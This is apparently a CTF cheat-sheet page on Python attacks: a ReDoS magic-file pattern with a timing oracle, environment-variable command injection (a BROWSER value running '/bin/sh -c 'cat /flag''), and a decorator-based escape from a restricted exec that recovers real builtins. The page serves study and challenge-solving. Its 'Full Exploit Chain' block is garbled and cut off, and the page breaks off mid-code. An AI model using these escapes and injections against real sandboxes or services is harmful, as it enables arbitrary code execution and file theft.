<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Magic File ReDoS</h2><a id="user-content-magic-file-redos" class="anchor" aria-label="Permalink: Magic File ReDoS" href="#magic-file-redos"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Evil magic file:</strong></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="0 regex (a+)+$ Vulnerable pattern"><pre lang="text" class="notranslate"><code>0 regex (a+)+$ Vulnerable pattern
</code></pre></div>
<p dir="auto"><strong>Timing oracle:</strong></p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="def measure(payload):
    start = time.time()
    requests.post(URL, data={'magic': payload})
    return time.time() - start"><pre><span class="pl-k">def</span> <span class="pl-en">measure</span>(<span class="pl-s1">payload</span>):
    <span class="pl-s1">start</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>()
    <span class="pl-s1">requests</span>.<span class="pl-c1">post</span>(<span class="pl-c1">URL</span>, <span class="pl-s1">data</span><span class="pl-c1">=</span>{<span class="pl-s">'magic'</span>: <span class="pl-s1">payload</span>})
    <span class="pl-k">return</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>() <span class="pl-c1">-</span> <span class="pl-s1">start</span></pre></div>

<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Environment Variable RCE</h2><a id="user-content-environment-variable-rce" class="anchor" aria-label="Permalink: Environment Variable RCE" href="#environment-variable-rce"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER=&quot;/bin/sh -c 'cat /flag' %s&quot;"><pre>PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER=<span class="pl-s"><span class="pl-pds">"</span>/bin/sh -c 'cat /flag' %s<span class="pl-pds">"</span></span></pre></div>
<p dir="auto"><strong>Other dangerous vars:</strong></p>
<ul dir="auto">
<li><code>PYTHONSTARTUP</code> - executed on interactive</li>
<li><code>PYTHONPATH</code> - inject modules</li>
<li><code>PYTHONINSPECT</code> - drop to shell</li>
</ul>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Decorator-Based Escape (No Call, No Quotes, No Equals)</h2><a id="user-content-decorator-based-escape-no-call-no-quotes-no-equals" class="anchor" aria-label="Permalink: Decorator-Based Escape (No Call, No Quotes, No Equals)" href="#decorator-based-escape-no-call-no-quotes-no-equals"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Pattern (Ergastulum):</strong> <code>ast.Call</code> banned, no quotes, no <code>=</code>, no commas, charset <code>a-z0-9()[]:._@\n</code>. Exec context has <code>__builtins__={}</code> and <code>__loader__=_frozen_importlib.BuiltinImporter</code>.</p>
<p dir="auto"><strong>Key insight:</strong> Decorators bypass <code>ast.Call</code> — <code>@expr</code> on <code>def name(): body</code> compiles to <code>name = expr(func)</code>, calling <code>expr</code> without an <code>ast.Call</code> node. This also provides assignment without <code>=</code>.</p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Technique 1: <code>function.__name__</code> as String Keys</h3><a id="user-content-technique-1-function__name__-as-string-keys" class="anchor" aria-label="Permalink: Technique 1: function.__name__ as String Keys" href="#technique-1-function__name__-as-string-keys"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">Define a function to create a string matching a dict key:</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="def __builtins__():   # __builtins__.__name__ == &quot;__builtins__&quot;
    0
def exec():           # exec.__name__ == &quot;exec&quot;
    0"><pre><span class="pl-k">def</span> <span class="pl-en">__builtins__</span>():   <span class="pl-c"># __builtins__.__name__ == "__builtins__"</span>
    <span class="pl-c1">0</span>
<span class="pl-k">def</span> <span class="pl-en">exec</span>():           <span class="pl-c"># exec.__name__ == "exec"</span>
    <span class="pl-c1">0</span></pre></div>
<p dir="auto">Use as dict subscript: <code>some_dict[exec.__name__]</code> accesses <code>some_dict["exec"]</code>.</p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Technique 2: Name Extractor via getset_descriptor</h3><a id="user-content-technique-2-name-extractor-via-getset_descriptor" class="anchor" aria-label="Permalink: Technique 2: Name Extractor via getset_descriptor" href="#technique-2-name-extractor-via-getset_descriptor"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><code>function_type.__dict__['__name__'].__get__</code> takes a function and returns its <code>.__name__</code> string. This enables chained decorators:</p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="@dict_obj.__getitem__        # Step 2: dict[&quot;key_name&quot;] → value
@func.__class__.__dict__[__name__.__name__].__get__  # Step 1: extract .__name__
def key_name():              # function with __name__ == &quot;key_name&quot;
    0
# Result: key_name = dict_obj[&quot;key_name&quot;]"><pre><span class="pl-en">@<span class="pl-s1">dict_obj</span>.<span class="pl-c1">__getitem__</span>        <span class="pl-c"># Step 2: dict["key_name"] → value</span></span>
<span class="pl-en">@<span class="pl-s1">func</span>.<span class="pl-c1">__class__</span>.<span class="pl-c1">__dict__</span>[<span class="pl-s1">__name__</span>.<span class="pl-c1">__name__</span>].<span class="pl-c1">__get__</span>  <span class="pl-c"># Step 1: extract .__name__</span></span>
<span class="pl-k">def</span> <span class="pl-en">key_name</span>():              <span class="pl-c"># function with __name__ == "key_name"</span>
    <span class="pl-c1">0</span>
<span class="pl-c"># Result: key_name = dict_obj["key_name"]</span></pre></div>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Technique 3: Accessing Real Builtins via <strong>loader</strong></h3><a id="user-content-technique-3-accessing-real-builtins-via-loader" class="anchor" aria-label="Permalink: Technique 3: Accessing Real Builtins via loader" href="#technique-3-accessing-real-builtins-via-loader"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="__loader__.load_module.__func__.__globals__[&quot;__builtins__&quot;]"><pre><span class="pl-s1">__loader__</span>.<span class="pl-c1">load_module</span>.<span class="pl-c1">__func__</span>.<span class="pl-c1">__globals__</span>[<span class="pl-s">"__builtins__"</span>]</pre></div>
<p dir="auto">Contains real <code>exec</code>, <code>__import__</code>, <code>print</code>, <code>compile</code>, <code>chr</code>, <code>type</code>, <code>getattr</code>, <code>setattr</code>, etc.</p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Full Exploit Chain</h3><a id="user-content-full-exploit-chain" class="anchor" aria-label="Permalink: Full Exploit Chain" href="#full-exploit-chain"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="# Step 1: Define helper functions for string key extraction

<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">How the Decorator Chain Works (Bottom-Up)</h3><a id="user-content-how-the-decorator-chain-works-bottom-up" class="anchor" aria-label="Permalink: How the Decorator Chain Works (Bottom-Up)" href="#how-the-decorator-chain-works-bottom-up"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="@outer_func
@inner_func
def name():
    0"><pre><span class="pl-en">@<span class="pl-s1">outer_func</span></span>
<span class="pl-en">@<span class="pl-s1">inner_func</span></span>
<span class="pl-k">def</span> <span class="pl-en">name</span>():
    <span class="pl-c1">0</span></pre></div>
<p dir="auto">Executes as: <code>name = outer_func(inner_func(function_named_name))</code></p>
<p dir="auto">For the <code>__import__</code> extraction:</p>
<ol dir="auto">
<li><code>__builtins__.__class__</code> → <code>&lt;class 'function'&gt;</code> (type of our defined function)</li>
<li><code>.__dict__[__name__.__name__]</code> → <code>function.__dict__["__name__"]</code> → getset_descriptor</li>
<li><code>.__get__</code> → descriptor's getter (takes function, returns its <code>.__name__</code> string)</li>
<li>Applied to <code>def __import__(): 0</code> → returns string <code>"__import__"</code></li>
<li><code>globals_dict["__builtins__"].__getitem__("__import__")</code> → real <code>__import__</code> function</li>
</ol>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Variations</h3><a id="user-content-variations" class="anchor" aria-label="Permalink: Variations" href="#variations"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><strong>Execute arbitrary code via exec + code object:</strong></p>
<div class="highlight highlight-source-python notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="def __code__():
    0
@exec_function
@__builtins__.__class__.__dict__[__code__.__name__].__get__
def payload():
    ... # code to execute (still subject to charset/AST restrictions)"><pre><span class="pl-k">def</span> <span class="pl-en">__code__</span>():
    <span class="pl-c1">0</span>
<span class="pl-en">@<span class="pl-s1">exec_function</span></span>
<span class="pl-en">@<span class="pl-s1">__builtins__</span>.<span class="pl-c1">__class__</span>.<span class="pl-c1">__dict__</span>[<span class="pl-s1">__code__</span>.<span class="pl-c1">__name__</span>].<span class="pl-c1">__get__</span></span>
